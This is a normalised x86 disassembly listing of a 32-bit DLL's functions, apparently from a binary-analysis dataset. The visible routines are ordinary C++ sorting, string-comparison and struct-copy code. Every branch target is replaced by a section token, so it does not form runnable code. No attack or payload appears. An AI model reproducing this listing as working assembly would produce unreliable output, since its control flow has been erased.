mov ebx [ ebp - 0xf8 ]
cmp [ esi + 0x14 ] 0x10
mov edi [ esi + 0x10 ]
jb r-xdata
test eax eax
sets al
test al al
jne r-xdata
xor eax eax
mov al [ esi ]
cmp al [ edi ]
jne r-xdata
add esi 0x4
add edi 0x4
sub ecx 0x4
jae r-xdata
mov edi [ ebp - 0xec ]
mov ecx [ ebp - 0xfc ]
cmp [ ebp - 0x100 ] 0x10
jb r-xdata
test eax eax
xor eax eax
mov al [ edi ]
cmp al [ esi ]
jne r-xdata
add edi 0x4
add esi 0x4
sub edx 0x4
jae r-xdata
cmp [ ebp - 0x104 ] 0x10
jb r-xdata
mov esi [ esi ]
mov ebx [ ebp - 0xe8 ]
mov edi [ ebp - 0xf4 ]
jmp r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov eax [ esi + 0x30 ]
lea ecx [ edi + 0x38 ]
mov [ edi + 0x30 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x34 ] eax
lea eax [ esi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push ebx
call sub_10003a20
mov eax [ edi + 0x30 ]
lea ecx [ ebx + 0x38 ]
mov [ ebx + 0x30 ] eax
mov eax [ edi + 0x34 ]
add edi 0x38
mov [ ebx + 0x34 ] eax
cmp ecx edi
je r-xdata
push 0xffffffff
push 0x0
push esi
call sub_10003a20
mov ebx [ ebp - 0xf0 ]
cmp [ ebp - 0x114 ] 0x10
jb r-xdata
test eax eax
sets al
test al al
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ edi ]
jne r-xdata
add ebx 0x4
add edi 0x4
sub ecx 0x4
jae r-xdata
mov edx [ eax + 0x4 ]
cmp edx 0x10
mov ebx [ eax ]
mov [ ebp - 0x104 ] edx
lea edx [ eax - 0x10 ]
jb r-xdata
mov esi [ ebp - 0xe4 ]
mov eax [ ebp - 0xf4 ]
cmp [ ebp - 0x104 ] 0x10
jb r-xdata
mov esi [ esi ]
mov eax [ ebp - 0x100 ]
mov esi [ ebp - 0xe8 ]
jmp r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
mov eax [ esi ]
cmp eax [ edi ]
jne r-xdata
mov edi [ ebp - 0xe4 ]
add edi 0x38
cmp [ edi + 0x14 ] 0x10
mov eax [ edi + 0x10 ]
mov [ ebp - 0xf0 ] eax
jb r-xdata
mov ecx [ ecx ]
sets al
test al al
jne r-xdata
mov eax [ ebp - 0xf0 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov eax [ edi ]
cmp eax [ esi ]
jne r-xdata
cmp ebx edi
mov edx edi
cmovb edx ebx
test edx edx
je r-xdata
mov ecx [ ecx ]
test eax eax
je r-xdata
mov al [ ebx + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
lea eax [ esi + 0x50 ]
push eax
lea ecx [ edi + 0x50 ]
call sub_100049b0
lea eax [ esi + 0x5c ]
push eax
lea ecx [ edi + 0x5c ]
call sub_100049b0
lea eax [ ebp - 0x78 ]
cmp esi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov ecx [ ebp - 0xe4 ]
mov ebx [ ebp - 0xec ]
add ebx 0x50
push ebx
lea ecx [ ecx + 0x50 ]
call sub_100049b0
mov ecx [ ebp - 0xe4 ]
mov eax [ ebp - 0xec ]
add eax 0x5c
push eax
lea ecx [ ecx + 0x5c ]
call sub_100049b0
mov eax [ ebp - 0xec ]
lea ecx [ ebp - 0xe0 ]
cmp eax ecx
je r-xdata
push 0xffffffff
push 0x0
push edi
call sub_100018b0
mov eax [ ecx ]
lea edx [ ecx - 0x10 ]
mov [ ebp - 0x100 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x110 ] eax
cmp eax 0x10
jb r-xdata
jmp r-xdata
cmp [ ebp - 0x110 ] 0x10
jb r-xdata
mov esi [ esi ]
mov ebx [ ebp - 0x104 ]
mov edi [ ebp - 0x100 ]
jmp r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
cmp ebx edi
mov ecx edi
cmovb ecx ebx
test ecx ecx
je r-xdata
mov edx [ edx ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
mov esi edi
mov esi [ edi ]
jmp r-xdata
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp ebx edi
jae r-xdata
sub edx 0x4
jb r-xdata
cmp edx 0xfffffffe
je r-xdata
lea eax [ ebp - 0x60 ]
cmp ebx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_100018b0
lea eax [ ebp - 0xc8 ]
cmp esi eax
je r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_100018b0
mov ecx [ ebp - 0x108 ]
cmp eax ecx
cmp edi ebx
mov eax ebx
cmovb eax edi
test eax eax
je r-xdata
mov edx [ edx ]
test eax eax
je r-xdata
mov al [ ebx + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
cmp ebx edi
jae r-xdata
sub ecx 0x4
jb r-xdata
cmp ecx 0xfffffffe
je r-xdata
cmp eax ebx
jae r-xdata
sub edx 0x4
jb r-xdata
cmp eax ebx
mov edx ebx
cmovb edx eax
test edx edx
je r-xdata
cmp edx 0xfffffffe
je r-xdata
xor eax eax
cmp ebx edi
setne al
or eax 0xffffffff
jmp r-xdata
cmp edx 0xfffffffc
je r-xdata
mov eax [ ecx ]
cmp eax [ esi ]
jne r-xdata
mov al [ ebx + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
mov eax [ ebp - 0x48 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x40 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_10003a20
mov ecx [ ebp - 0xec ]
mov eax [ ebp - 0xb0 ]
mov [ ecx + 0x30 ] eax
mov eax [ ebp - 0xac ]
mov [ ecx + 0x34 ] eax
lea eax [ ebp - 0xa8 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10003a20
cmp edi ebx
jae r-xdata
sub eax 0x4
jb r-xdata
cmp ecx 0xfffffffe
je r-xdata
xor eax eax
cmp ebx edi
setne al
or eax 0xffffffff
jmp r-xdata
cmp ecx 0xfffffffc
je r-xdata
mov eax [ edx ]
cmp eax [ esi ]
jne r-xdata
mov al [ esi + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
xor eax eax
cmp [ ebp - 0xf0 ] ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp edx 0xfffffffc
je r-xdata
mov eax [ esi ]
cmp eax [ ecx ]
jne r-xdata
mov al [ edi + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
mov edi [ ebp - 0xec ]
mov eax [ ebp - 0xf0 ]
sub ebx 0x68
sub eax 0x68
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf0 ] eax
cmp [ ebp - 0x108 ] ebx
jb r-xdata
test eax eax
xor eax eax
mov al [ ecx ]
cmp al [ esi ]
jne r-xdata
add ecx 0x4
add esi 0x4
sub edx 0x4
jae r-xdata
cmp edx 0xffffffff
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x78 ]
call sub_10014980
mov ebx [ ebp - 0xf8 ]
mov esi [ ebp - 0xe4 ]
mov eax [ ebp - 0xf4 ]
mov ecx [ ebp - 0xfc ]
jmp r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
lea eax [ ebp - 0x90 ]
mov ecx ebx
push eax
call sub_100049b0
mov edi [ ebp - 0xec ]
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ edi + 0x5c ]
call sub_100049b0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xe0 ]
call sub_10014980
mov eax [ ebp - 0xf8 ]
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_100018b0
xor eax eax
cmp edi ebx
setne al
or eax 0xffffffff
jmp r-xdata
cmp eax 0xfffffffc
je r-xdata
mov ecx [ edx ]
cmp ecx [ esi ]
jne r-xdata
mov al [ ebx + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
mov edi [ ebp - 0xec ]
mov eax edi
mov ebx [ ebp - 0xf8 ]
add edi 0x68
mov [ ebp - 0xec ] edi
cmp eax ebx
je r-xdata
test eax eax
xor eax eax
mov al [ edx ]
cmp al [ esi ]
jne r-xdata
add edx 0x4
add esi 0x4
sub ecx 0x4
jae r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe8 ]
add eax 0x68
add ecx 0x68
mov [ ebp - 0xec ] eax
mov [ ebp - 0xe8 ] ecx
cmp eax [ ebp - 0xfc ]
jb r-xdata
test eax eax
xor eax eax
mov al [ esi ]
cmp al [ ecx ]
jne r-xdata
add esi 0x4
add ecx 0x4
sub edx 0x4
jae r-xdata
cmp edx 0xffffffff
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0xe4 ]
sets al
test al al
jne r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov al [ ebx + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
mov eax [ ebp - 0xf4 ]
mov ebx [ ebp - 0xf0 ]
mov esi [ ebp - 0xe4 ]
mov ecx [ ebp - 0xe8 ]
sub esi 0x68
sub ecx 0x68
mov [ ebp - 0xe4 ] esi
lea eax [ ebx - 0x48 ]
mov [ ebp - 0xe8 ] ecx
cmp esi eax
je r-xdata
test eax eax
xor eax eax
mov cl [ edx ]
cmp cl [ esi ]
jne r-xdata
add edx 0x4
add esi 0x4
sub eax 0x4
jae r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ ebp - 0xf0 ]
add ebx 0x68
mov ecx [ ebp - 0xe8 ]
add eax 0x68
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf0 ] eax
cmp ebx [ ebp - 0xfc ]
jb r-xdata
lea ecx [ edi - 0x68 ]
mov edx ebx
call sub_1003ab20
jmp r-xdata
sets al
test al al
jne r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp ecx 0xfffffffd
je r-xdata
mov al [ esi + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
sets al
test al al
jne r-xdata
mov eax [ ebp - 0xf0 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov al [ edi + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
test eax eax
jne r-xdata
mov al [ ecx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
mov eax [ ebp - 0xf4 ]
sub ebx 0x68
sub eax 0x68
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xf4 ] eax
cmp [ ebp - 0x108 ] eax
jb r-xdata
lea edx [ ebx - 0x48 ]
mov ecx esi
call sub_1003ab20
jmp r-xdata
sets al
test al al
jne r-xdata
sbb eax eax
or eax 0x1
jmp r-xdata
cmp eax 0xfffffffd
je r-xdata
mov al [ ebx + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
test eax eax
jne r-xdata
mov al [ edx + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
mov al [ esi + 0x1 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
cmp edx 0xfffffffe
je r-xdata
mov ecx [ ebp - 0xe8 ]
test eax eax
jne r-xdata
mov cl [ edx + 0x1 ]
cmp cl [ esi + 0x1 ]
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
cmp edx 0xfffffffe
je r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov al [ edx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
mov al [ esi + 0x2 ]
cmp al [ ecx + 0x2 ]
jne r-xdata
cmp edx 0xffffffff
je r-xdata
mov cl [ edx + 0x2 ]
cmp cl [ esi + 0x2 ]
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
cmp edx 0xffffffff
je r-xdata
mov al [ ecx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
mov al [ esi + 0x3 ]
cmp al [ ecx + 0x3 ]
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ esi + 0x3 ]
je r-xdata
sub_1003a320
push ebp
mov ebp esp
push 0xffffffff
push sub_10053360
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_10039650
add ebx 0x8
mov [ ebp + 0x8 ] ebx
add edi 0x8
mov [ ebp - 0x14 ] edi
jmp r-xdata
cmp edi esi
je r-xdata
sub_1003a3a0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
mov eax 0x4ec4ec4f
mov ecx [ ebp + 0x8 ]
mov esi ecx
push edi
push [ ebp + 0xc ]
mov edi edx
mov [ ebp - 0x8 ] ebx
sub esi ebx
mov [ ebp - 0x4 ] edi
imul esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x28
jle r-xdata
push ecx
mov edx edi
mov ecx ebx
call sub_1003aa00
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x8 ]
inc eax
cdq
mov ecx esi
and edx 0x7
add eax edx
sar eax 0x3
imul ebx eax 0xd0
imul edi eax 0x68
lea eax [ ebx + esi ]
lea edx [ edi + esi ]
push eax
call sub_1003aa00
mov edx [ ebp - 0x4 ]
mov ecx edx
push [ ebp + 0xc ]
sub ecx edi
lea eax [ edi + edx ]
push eax
call sub_1003aa00
mov eax [ ebp + 0x8 ]
mov esi eax
push [ ebp + 0xc ]
sub esi edi
push eax
sub eax ebx
mov edx esi
mov ecx eax
call sub_1003aa00
mov ecx [ ebp - 0x8 ]
push [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
push esi
lea ecx [ edi + ecx ]
call sub_1003aa00
add esp 0x20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1003a450
push ebp
mov ebp esp
push 0xffffffff
push sub_10053388
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
sub edx ebx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x80 ] eax
cdq
sub eax edx
mov esi eax
sar esi 0x1
test esi esi
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
imul edi esi 0x68
add edi ebx
sub edi 0x68
lea ecx [ ebp - 0x7c ]
push edi
dec esi
call sub_1002d810
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x7c ]
push [ ebp + 0x8 ]
mov edx esi
mov ecx ebx
push eax
push [ ebp - 0x80 ]
call sub_1003abf0
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x7c ]
call sub_10014980
test esi esi
jg r-xdata
sub_1003a500
push ebp
mov ebp esp
push 0xffffffff
push sub_10053388
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov edi ecx
mov esi ebx
mov eax 0x4ec4ec4f
sub esi edi
imul esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax 0xffffffe8
lea esi [ ebx - 0x50 ]
sub eax edi
mov [ ebp - 0x84 ] eax
mov eax 0x50
sub eax edi
mov [ ebp - 0x80 ] eax
lea eax [ edi + 0x18 ]
cmp esi eax
je r-xdata
push 0xffffffff
push 0x0
push edi
mov ecx ebx
call sub_100018b0
mov eax [ edi + 0x30 ]
lea ecx [ esi + 0x20 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x34 ]
mov [ esi + 0x1c ] eax
lea eax [ edi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10003a20
lea eax [ edi + 0x50 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_100049b0
lea eax [ edi + 0x5c ]
push eax
lea ecx [ esi + 0x44 ]
call sub_100049b0
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
lea eax [ ebp - 0x7c ]
push eax
mov eax 0x4ec4ec4f
lea ecx [ ecx + esi ]
imul ecx
mov ecx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
xor edx edx
push eax
call sub_1003abf0
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x7c ]
call sub_10014980
mov ecx [ ebp - 0x80 ]
sub esi 0x68
mov eax 0x4ec4ec4f
lea ecx [ ecx + esi ]
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jg r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
lea ebx [ esi - 0x18 ]
push ebx
lea ecx [ ebp - 0x7c ]
call sub_1002d810
mov [ ebp - 0x4 ] 0x0
lea eax [ esi - 0x18 ]
cmp eax edi
je r-xdata
sub_1003a660
push ebp
mov ebp esp
push 0xffffffff
push sub_100533b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax edx
mov [ ebp - 0x84 ] eax
mov esi ecx
mov [ ebp - 0x88 ] esi
cmp esi eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea edi [ esi + 0x68 ]
mov [ ebp - 0x7c ] edi
cmp edi eax
je r-xdata
add esi 0x38
mov [ ebp - 0x80 ] esi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax edi
jae r-xdata
sub edx 0x4
jb r-xdata
cmp [ ebp - 0x2c ] 0x10
lea esi [ ebp - 0x40 ]
mov eax [ ebp - 0x30 ]
mov edx edi
cmovae esi [ ebp - 0x40 ]
cmp eax edi
cmovb edx eax
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x30 ] edi
setne al
or eax 0xffffffff
jmp r-xdata
cmp edx 0xfffffffc
je r-xdata
mov eax [ esi ]
cmp eax [ ecx ]
jne r-xdata
add edi 0x18
push [ ebp - 0x80 ]
mov esi [ ebp - 0x88 ]
lea eax [ edi + 0x68 ]
push eax
mov edx edi
mov ecx esi
call sub_1003af90
lea eax [ ebp - 0x78 ]
add esp 0x8
cmp esi eax
je r-xdata
test eax eax
xor eax eax
mov al [ esi ]
cmp al [ ecx ]
jne r-xdata
add esi 0x4
add ecx 0x4
sub edx 0x4
jae r-xdata
lea eax [ edi + 0x20 ]
mov eax [ edi + 0x20 ]
jmp r-xdata
lea ecx [ esi + 0x18 ]
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_100018b0
mov edi [ ebp - 0x7c ]
sets al
test al al
je r-xdata
mov eax [ ebp - 0x30 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp edx 0xfffffffd
je r-xdata
mov edx [ ebp - 0x30 ]
cmp edx ecx
jae r-xdata
sub esi 0x4
jb r-xdata
cmp [ ebp - 0x2c ] 0x10
lea edx [ ebp - 0x40 ]
mov esi ecx
cmovae edx [ ebp - 0x40 ]
cmp [ ebp - 0x30 ] ecx
cmovb esi [ ebp - 0x30 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x48 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x40 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
test eax eax
jne r-xdata
mov al [ esi + 0x1 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
xor eax eax
cmp edx ecx
setne al
or eax 0xffffffff
jmp r-xdata
cmp esi 0xfffffffc
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax ]
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
jmp r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
cmp edx 0xfffffffe
je r-xdata
lea eax [ ebp - 0x78 ]
cmp ebx eax
je r-xdata
lea eax [ edi - 0x18 ]
cmp ebx eax
je r-xdata
test eax eax
xor eax eax
mov cl [ edx ]
cmp cl [ eax ]
jne r-xdata
add edx 0x4
add eax 0x4
sub esi 0x4
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x78 ]
call sub_10014980
mov esi [ ebp - 0x80 ]
add edi 0x68
mov [ ebp - 0x7c ] edi
cmp edi [ ebp - 0x84 ]
jne r-xdata
mov al [ esi + 0x2 ]
cmp al [ ecx + 0x2 ]
jne r-xdata
lea ecx [ ebx + 0x18 ]
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_100018b0
lea ecx [ ebx + 0x18 ]
cmp ecx edi
je r-xdata
push 0xffffffff
push 0x0
lea eax [ edi - 0x18 ]
mov ecx ebx
push eax
call sub_100018b0
sets al
test al al
je r-xdata
mov ecx [ edi + 0x30 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
push edi
lea ecx [ ebp - 0x78 ]
mov ebx edi
call sub_1002d810
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x14 ] 0x10
mov edi [ esi + 0x10 ]
jb r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp - 0x48 ]
lea ecx [ ebx + 0x38 ]
mov [ ebx + 0x30 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebx + 0x34 ] eax
lea eax [ ebp - 0x40 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ edi + 0x18 ]
lea ecx [ ebx + 0x38 ]
mov [ ebx + 0x30 ] eax
mov eax [ edi + 0x1c ]
mov [ ebx + 0x34 ] eax
lea eax [ edi + 0x20 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push edi
call sub_10003a20
test eax eax
jne r-xdata
mov cl [ edx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov al [ esi + 0x3 ]
cmp al [ ecx + 0x3 ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebx + 0x50 ]
call sub_100049b0
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebx + 0x5c ]
call sub_100049b0
mov edi [ ebp - 0x7c ]
push 0xffffffff
push 0x0
push eax
call sub_100018b0
lea eax [ edi + 0x38 ]
push eax
lea ecx [ ebx + 0x50 ]
call sub_100049b0
lea eax [ edi + 0x44 ]
push eax
lea ecx [ ebx + 0x5c ]
call sub_100049b0
lea ebx [ edi - 0x18 ]
jmp r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
cmp esi 0xfffffffe
je r-xdata
mov ecx [ edi - 0x38 ]
sub edi 0x68
cmp [ edi + 0x34 ] 0x10
jb r-xdata
mov cl [ edx + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov cl [ edx + 0x3 ]
cmp cl [ eax + 0x3 ]
je r-xdata
sub_1003a990
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
lea eax [ edi + 0x18 ]
lea ecx [ esi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push edi
call sub_100018b0
mov eax [ edi + 0x30 ]
lea ecx [ esi + 0x38 ]
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
lea eax [ edi + 0x38 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ edi + 0x50 ]
push eax
lea ecx [ esi + 0x50 ]
call sub_100049b0
lea eax [ edi + 0x5c ]
push eax
lea ecx [ esi + 0x5c ]
call sub_100049b0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xffffffff
push 0x0
push eax
call sub_100018b0
sub_1003aa00
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x4c ] 0x10
mov eax edx
push ebx
push esi
push edi
lea edi [ ecx + 0x38 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi + 0x10 ]
lea esi [ eax + 0x38 ]
mov [ ebp - 0x4 ] eax
jb r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov ebx [ esi + 0x10 ]
jb r-xdata
jns r-xdata
mov ecx [ edi + 0x10 ]
cmp ebx ecx
jb r-xdata
cmp ebx ecx
mov eax ecx
mov ecx [ ebp - 0x8 ]
cmovb eax ebx
push eax
call sub_10030db0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x10 ]
add ecx 0x38
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_1003ab20
cmp ebx ecx
setne al
test eax eax
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx edx
mov eax edx
mov edx [ ebp - 0x8 ]
cmovb eax ebx
push eax
call sub_10030db0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ecx ]
cmp [ ecx + 0x14 ] 0x10
mov ebx [ ecx + 0x10 ]
jb r-xdata
jns r-xdata
mov ecx [ esi + 0x10 ]
cmp ebx ecx
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_1003ab20
cmp [ edi + 0x14 ] 0x10
mov ecx [ edi + 0x10 ]
mov [ ebp - 0x8 ] ecx
jb r-xdata
cmp ebx ecx
setne al
test eax eax
cmp [ esi + 0x14 ] 0x10
mov ebx [ esi + 0x10 ]
jb r-xdata
mov edi [ edi ]
cmp ebx ecx
mov eax ecx
mov edx edi
mov ecx esi
cmovb eax ebx
push eax
call sub_10030db0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esi ]
jns r-xdata
mov ecx [ ebp - 0x8 ]
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_1003ab20
cmp ebx ecx
setne al
test eax eax
sub_1003ab20
push ebp
mov ebp esp
push 0xffffffff
push sub_100533e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
push esi
lea ecx [ ebp - 0x78 ]
call sub_1002d810
mov [ ebp - 0x4 ] 0x0
mov ecx esi
push edi
call sub_1003a990
lea eax [ ebp - 0x78 ]
cmp edi eax
je r-xdata
lea ecx [ edi + 0x18 ]
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_100018b0
mov eax [ ebp - 0x48 ]
lea ecx [ edi + 0x38 ]
mov [ edi + 0x30 ] eax
